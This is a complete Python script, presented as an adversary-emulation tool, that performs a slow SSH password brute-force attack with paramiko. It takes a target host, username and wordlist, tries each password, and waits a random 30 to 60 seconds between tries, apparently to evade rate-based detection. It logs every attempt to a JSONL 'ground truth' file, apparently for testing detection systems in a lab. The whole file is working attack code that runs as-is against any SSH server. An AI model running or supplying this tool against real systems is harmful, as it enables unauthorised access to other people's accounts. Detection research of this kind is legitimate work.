#!/usr/bin/env python3
import paramiko
import time
import random
import argparse
import sys
import json
import os
import socket
from datetime import datetime, timezone

def get_local_ip():
    """Offline-safe interface resolution. Does not ping internet."""
    try:
        # Tries to get the local hostname and its IP
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
        if host_ip and not host_ip.startswith("127."):
            return host_ip
    except Exception:
        pass
    
    # Fallback to connecting to a generic private space IP to force routing table resolution
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def slow_bruteforce(target, port, username, password_list, min_delay, max_delay, log_file, source_ip):
    print(f"[*] [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting slow brute force against {target}:{port} for user '{username}' from {source_ip}")
    
    try:
        with open(password_list, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: Wordlist '{password_list}' not found.")
        sys.exit(1)

    try:
        for i, password in enumerate(passwords):
            timestamp = datetime.now(timezone.utc).isoformat()
            local_time_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"[*] [{local_time_str}] Attempt {i+1}/{len(passwords)}: Trying password '{password}'")
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            attempt_record = {
                "timestamp_utc": timestamp,
                "source_ip": source_ip,
                "target": target,
                "port": port,
                "username": username,
                "password_attempted": password,
                "success": False,
                "error": None
            }
            
            try:
                client.connect(target, port=port, username=username, password=password, timeout=5)
                print(f"[+] SUCCESS! Password found: {password}")
                attempt_record["success"] = True
                client.close()
            except paramiko.AuthenticationException:
                pass 
            except Exception as e:
                attempt_record["error"] = str(e)
            finally:
                client.close()
                
            with open(log_file, 'a') as lf:
                lf.write(json.dumps(attempt_record) + "\n")
                lf.flush()
                os.fsync(lf.fileno())
                
            if attempt_record["success"]:
                break
                
            if i < len(passwords) - 1:
                delay = random.uniform(min_delay, max_delay)
                time.sleep(delay)

        print(f"[*] Campaign finished. Ground truth saved to {log_file}")
    
    except KeyboardInterrupt:
        print("\n[!] Campaign aborted early by user (KeyboardInterrupt).")
        print(f"[*] Ground truth for completed attempts saved to {log_file}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Slow SSH Brute Force Emulator (Adversary Emulation)")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="Target SSH port")
    parser.add_argument("-u", "--username", required=True, help="Target username")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password list file")
    parser.add_argument("--min-delay", type=float, default=30.0, help="Minimum delay (seconds)")
    parser.add_argument("--max-delay", type=float, default=60.0, help="Maximum delay (seconds)")
    
    default_ip = get_local_ip()
    parser.add_argument("--source-ip", default=default_ip, help="Spoof or enforce source IP logging")
    parser.add_argument("-l", "--log-file", default=f"attack_ground_truth_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl", help="Ground truth log path")
    
    args = parser.parse_args()
    if args.source_ip == "127.0.0.1":
        print("[!] Warning: Could not resolve network IP. Using 127.0.0.1. Passing --source-ip is strongly recommended in isolated labs.")
        
    slow_bruteforce(args.target, args.port, args.username, args.wordlist, args.min_delay, args.max_delay, args.log_file, args.source_ip)
